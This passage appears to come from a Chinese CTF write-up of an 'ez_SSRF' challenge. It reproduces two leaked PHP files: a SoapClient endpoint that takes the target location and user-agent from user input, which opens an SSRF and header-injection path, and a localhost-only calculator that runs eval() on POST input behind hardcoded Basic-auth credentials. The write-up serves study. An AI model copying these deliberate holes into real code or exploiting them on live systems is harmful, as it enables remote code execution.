最经典的原型链污染中的merge函数，考虑python原型链污染，当时这个点有点忘记了，于是回去复习了一波

# ez_SSRF

lhRaMk7写了个计算器网站用来通过他的小升初数学考试，Parar看不惯直接黑了他的网站不给他作弊，你们觉得能让他作弊吗

打开只有一句话

```
Maybe you should check check some place in my website
```

让我们检查一下，那就常规搜集一下可用的信息，有www.zip压缩文件

```php
//h4d333333.php
<?php
error_reporting(0);
if(!isset($_POST['user'])){
    $user="stranger";
}else{
    $user=$_POST['user'];
}

if (isset($_GET['location'])) {
    $location=$_GET['location'];
    $client=new SoapClient(null,array(
        "location"=>$location,
        "uri"=>"hahaha",
        "login"=>"guest",
        "password"=>"gueeeeest!!!!",
        "user_agent"=>$user."'s Chrome"));

    $client->calculator();

    echo file_get_contents("result");
}else{
    echo "Please give me a location";
}
```

```php
//calculator.php
<?php
$admin="aaaaaaaaaaaadmin";
$adminpass="i_want_to_getI00_inMyT3st";

function check($auth) {
    global $admin,$adminpass;
    $auth = str_replace('Basic ', '', $auth);
    $auth = base64_decode($auth);
    list($username, $password) = explode(':', $auth);
    echo $username."<br>".$password;
    if($username===$admin && $password===$adminpass) {
        return 1;
    }else{
        return 2;
    }
}
if($_SERVER['REMOTE_ADDR']!=="127.0.0.1"){
    exit("Hacker");
}
$expression = $_POST['expression'];
$auth=$_SERVER['HTTP_AUTHORIZATION'];
if(isset($auth)){
    if (check($auth)===2) {
        if(!preg_match('/^[0-9+\-*\/]+$/', $expression)) {
            die("Invalid expression");
        }else{
            $result=eval("return $expression;");
            file_put_contents("result",$result);
        }
    }else{
        $result=eval("return $expression;");
        file_put_contents("result",$result);
    }
}else{
    exit("Hacker");
}
```

calculator.php限制了只能本地用户去访问
